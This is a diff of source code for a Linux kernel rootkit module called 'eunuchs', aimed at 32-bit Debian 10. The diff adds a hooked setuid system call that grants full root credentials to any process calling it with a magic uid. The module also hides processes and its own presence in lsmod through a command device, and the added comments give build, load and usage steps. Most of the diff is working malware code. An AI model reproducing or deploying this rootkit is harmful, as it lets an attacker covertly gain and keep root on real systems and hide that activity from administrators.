@@ -1,10 +1,10 @@
 /**
  * Targets Debian 10, x86-32bit
- * Kernel 4.19.0
+ * Kernel 4.19.67-2+deb10u1
+ *
  *
  * TODO:
  * hide/show files
- * setuid 0 (kill command/signals ?)
  * /etc/passwd & /etc/shadow
  **/
 
@@ -16,6 +16,37 @@
  *    find the address of the system call table and change the value below
  **/
 static unsigned long *sct = 0xc167b180;
+
+/**
+ * To build:
+ *  `sudo apt-get install build-essential linux-headers-($uname -r)`
+ *
+ * To load the module:
+ *  `sudo insmod eunuchs.ko`
+ *
+ * To unload the module:
+ *  `sudo rmmod eunuchs`
+ *  NB: The LKM must NOT be hidden in order to remove it.
+ *      `echo lemmesee > /dev/eunuchs` to show the module in the loaded module
+ *      list, so that it may be removed.
+ *
+ * To exploit the setuid intercept:
+ *  In your desired program, call `setuid(0xdead)`. Any other target uid will
+ *  function as usual, but this particular target uid will elevate to 0. See
+ *  the program in tools/icanhazshell.c for proof of concept.
+ *  `gcc -o tools/icanhazshell tools/icanhazshell.c`
+ *
+ *
+ * All other interaction with this module is done by writing to /dev/eunuchs.
+ * Commands:
+ *  ohaiplzshowallhiding            - shows all hidden pids (DEBUG ONLY)
+ *  kthxbye                         - hide the LKM from lsmod (NOTE: You can't
+ *                                    remove the LKM until after you make it 
+ *                                    visible again)
+ *  lemmesee                        - show the LKM in lsmod
+ *  ohaiplzhideproc [pid_to_hide]   - hides specified process by pid
+ *  ohaiplzshowproc [pid_to_show]   - shows specified process by pid
+ **/
 
 #include <linux/init.h>
 #include <linux/module.h>
@@ -32,6 +63,7 @@ static unsigned long *sct = 0xc167b180;
 #include <linux/string.h>       // string manipulation
 #include <linux/dirent.h>       // directory entries
 #include <linux/list.h>         // linked lists
+#include <linux/cred.h>        // credentials, for suid
 
 #include "eunuchs.h"
 
@@ -80,8 +112,8 @@ static ssize_t eunuchs_char_read(struct file *f, char __user *buf, size_t len, l
 /**
  * eunuchs_char_write(struct file*, char *, size_t, loff_t *) -
  *
- * This is our handler for writing to /dev/euchar. This can be written to by
- * `echo 'a' > /dev/euchar` as root.
+ * This is our handler for writing to /dev/eunuchs. This can be written to by
+ * `echo 'command' > /dev/eunuchs`.
  *
  *
  * Commands:
@@ -215,6 +247,41 @@ static int eunuchs_dev_remove()
 static typeof(sys_read) *orig_read;
 static typeof(sys_getdents) *orig_getdents;
 static typeof(sys_getdents64) *orig_getdents64;
+static typeof(sys_setuid) *orig_setuid;
+
+/**
+ * setuid() handler.
+ * If the provided taret uid is our supermagical uid, set uid to 0.
+ **/
+static asmlinkage long eunuchs_setuid(uid_t uid)
+{
+    struct cred *creds = NULL;
+
+    debug("setuid intercepted\n");
+
+    if(uid == EUNUCHS_MAGIC_UID)
+    {
+       debug("setting uid to 0\n");
+        creds = prepare_creds();
+        if(creds == NULL)
+            return -1;
+
+        creds->uid = (kuid_t){ 0 };
+        creds->gid = (kgid_t){ 0 };
+        creds->suid = (kuid_t){ 0 };
+        creds->sgid = (kgid_t){ 0 };
+        creds->euid = (kuid_t){ 0 };
+        creds->egid = (kgid_t){ 0 };
+        creds->fsuid = (kuid_t){ 0 };
+        creds->fsgid = (kgid_t){ 0 };
+
+        return commit_creds(creds);
+    }
+    else
+    {
+        return orig_setuid(uid);
+    }
+}
 
 /**
  * read() handler
@@ -533,6 +600,9 @@ static int eunuchs_hooks_install(void)
     orig_getdents64 = (typeof(sys_getdents64) *)sct[__NR_getdents64];
     sct[__NR_getdents64] = (void *)&eunuchs_getdents64;
 
+    orig_setuid = (typeof(sys_setuid) *)sct[__NR_setuid32];
+    sct[__NR_setuid32] = (void *)&eunuchs_setuid;
+
     return 0;
 }
 
@@ -546,6 +616,7 @@ static void eunuchs_hooks_remove(void)
     sct[__NR_read] = (void *)orig_read;
     sct[__NR_getdents] = (void *)orig_getdents;
     sct[__NR_getdents64] = (void *)orig_getdents64;
+    sct[__NR_setuid32] = (void *)orig_setuid;
 }
 
 /**
